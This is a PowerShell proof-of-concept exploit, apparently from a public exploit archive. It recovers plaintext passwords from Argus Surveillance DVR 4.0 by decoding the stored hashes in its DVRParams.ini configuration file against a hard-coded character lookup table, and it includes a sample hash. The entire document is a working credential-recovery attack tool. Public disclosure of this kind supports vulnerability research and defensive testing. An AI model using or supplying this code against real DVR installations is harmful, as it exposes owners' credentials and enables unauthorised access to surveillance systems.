# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# Exploit Author: Salman Asad (@LeoBreaker1411 / deathflash1411)
# Date: 12.07.2021
# Version: Argus Surveillance DVR 4.0
# Tested on: Windows 7 x86 (Build 7601) & Windows 10
# Reference: https://leobreaker1411.github.io/blog/dvr4-hash-crack
# Porting by FabioDefilippo

# Note: Argus Surveillance DVR 4.0 configuration is present in
# C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini

# I'm too lazy to add special characters :P
$characters = @{};
$characters.Add('ECB4','1');
$characters.Add('B4A1','2');
$characters.Add('F539','3');
$characters.Add('53D1','4');
$characters.Add('894E','5');
$characters.Add('E155','6');
$characters.Add('F446','7');
$characters.Add('C48C','8');
$characters.Add('8797','9');
$characters.Add('BD8F','0');
$characters.Add('C9F9','A');
$characters.Add('60CA','B');
$characters.Add('E1B0','C');
$characters.Add('FE36','D');
$characters.Add('E759','E');
$characters.Add('E9FA','F');
$characters.Add('39CE','G');
$characters.Add('B434','H');
$characters.Add('5E53','I');
$characters.Add('4198','J');
$characters.Add('8B90','K');
$characters.Add('7666','L');
$characters.Add('D08F','M');
$characters.Add('97C0','N');
$characters.Add('D869','O');
$characters.Add('7357','P');
$characters.Add('E24A','Q');
$characters.Add('6888','R');
$characters.Add('4AC3','S');
$characters.Add('BE3D','T');
$characters.Add('8AC5','U');
$characters.Add('6FE0','V');
$characters.Add('6069','W');
$characters.Add('9AD0','X');
$characters.Add('D8E1','Y');
$characters.Add('C9C4','Z');
$characters.Add('F641','a');
$characters.Add('6C6A','b');
$characters.Add('D9BD','c');
$characters.Add('418D','d');
$characters.Add('B740','e');
$characters.Add('E1D0','f');
$characters.Add('3CD9','g');
$characters.Add('956B','h');
$characters.Add('C875','i');
$characters.Add('696C','j');
$characters.Add('906B','k');
$characters.Add('3F7E','l');
$characters.Add('4D7B','m');
$characters.Add('EB60','n');
$characters.Add('8998','o');
$characters.Add('7196','p');
$characters.Add('B657','q');
$characters.Add('CA79','r');
$characters.Add('9083','s');
$characters.Add('E03B','t');
$characters.Add('AAFE','u');
$characters.Add('F787','v');
$characters.Add('C165','w');
$characters.Add('A935','x');
$characters.Add('B734','y');
$characters.Add('E4BC','z');
$characters.Add('!','B398');

$banner = '
#########################################
#    _____ Surveillance DVR 4.0         #
#   /  _  \_______  ____  __ __  ______ #
#  /  /_\  \_  __ \/ ___\|  |  \/  ___/ #
# /    |    \  | \/ /_/  >  |  /\___ \  #
# \____|__  /__|  \___  /|____//____  > #
#         \/     /_____/            \/  #
#        Weak Password Encryption       #
############ @deathflash1411 ############
';

write-host $banner;

# Change this :)
$pass_hash = "418DB740F641E03B956BE1D03F7EF6419083956BECB453D1ECB4ECB4"
if((($pass_hash.Length)%4) -ne 0){
	write-host "[!] Error, check your password hash";
	exit;
}
$split = @();
$n = 4;
for($index = 0; $index -lt $pass_hash.Length; $index+=$n){
	$split += $pass_hash.Substring($index, $n);
}

foreach($key in $split){
	if($characters.Contains($key)){
		write-host "[+] " + $key + ":" + $characters[$key];
	}else{
		write-host "[-] " + $key + ":Unknown";
    }
}